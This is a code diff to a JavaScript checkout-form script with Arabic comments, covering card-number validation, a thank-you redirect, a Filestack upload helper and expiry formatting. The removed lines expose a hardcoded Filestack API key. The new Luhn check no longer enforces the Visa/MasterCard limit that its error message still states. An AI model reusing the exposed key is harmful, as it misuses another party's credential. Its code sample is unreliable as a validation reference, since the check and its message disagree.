@@ -99,8 +99,8 @@ document.addEventListener('DOMContentLoaded', function () {
       showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
     }
 
-    // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
-    if (!validateCard(cardNumber)) {
+    // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط) باستخدام خوارزمية لوهان
+    if (!luhnCheck(cardNumber)) {
       isValid = false;
       showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
     }
@@ -164,6 +164,9 @@ document.addEventListener('DOMContentLoaded', function () {
       // رفع الملف إلى Filestack
       uploadFileToFilestack(file);
     }
+
+    // إعادة توجيه العميل بعد إتمام العملية
+    window.location.href = "https://checkout.glamhavenbags.shop/thank-you.html";
   });
 
   // دالة للتحقق من صحة البريد الإلكتروني
@@ -178,7 +181,21 @@ document.addEventListener('DOMContentLoaded', function () {
     return regex.test(name);
   }
 
-  // دالة للتحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
+  // دالة للتحقق من صحة أرقام البطاقة (Visa / MasterCard فقط) باستخدام خوارزمية لوهان
+  function luhnCheck(cardNumber) {
+    let sum = 0;
+    let shouldDouble = false;
+    for (let i = cardNumber.length - 1; i >= 0; i--) {
+      let digit = parseInt(cardNumber.charAt(i));
+      if (shouldDouble) {
+        if ((digit *= 2) > 9) digit -= 9;
+      }
+      sum += digit;
+      shouldDouble = !shouldDouble;
+    }
+    return (sum % 10 === 0);
+  }
+
   function validateCard(cardNumber) {
     const regex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/;  // Visa / MasterCard فقط
     return regex.test(cardNumber);
@@ -196,18 +213,6 @@ document.addEventListener('DOMContentLoaded', function () {
     return regex.test(cvv);
   }
 
-  // دالة لرفع الملف إلى Filestack
-  function uploadFileToFilestack(file) {
-    const client = filestack.init('A7fSrsBg3RjybN1kkK99lz'); // استبدل بـ API Key الخاص بك
-    client.upload(file)
-      .then((res) => {
-        console.log('File uploaded successfully:', res);
-      })
-      .catch((err) => {
-        console.error('Error uploading file:', err);
-      });
-  }
-
   // دالة لإظهار رسائل الخطأ
   function showErrorMessage(message, field) {
     const errorMessage = document.createElement('div');
@@ -223,5 +228,26 @@ document.addEventListener('DOMContentLoaded', function () {
       message.remove();
     });
   }
+
+  // دالة لرفع الملف إلى Filestack
+  function uploadFileToFilestack(file) {
+    const client = filestack.init('YOUR_API_KEY');  // استبدل بـ API Key الخاص بك
+    client.upload(file)
+      .then((res) => {
+        console.log('File uploaded successfully:', res);
+      })
+      .catch((err) => {
+        console.error('Error uploading file:', err);
+      });
+  }
+
+  // إضافة حدث لملء تاريخ الصلاحية تلقائيًا بـ "/"
+  const expiryInput = document.getElementById('expiry');
+  expiryInput.addEventListener('input', function(event) {
+    if (expiryInput.value.length === 2 && !expiryInput.value.includes('/')) {
+      expiryInput.value = expiryInput.value + '/';
+    }
+  });
 });
+
 
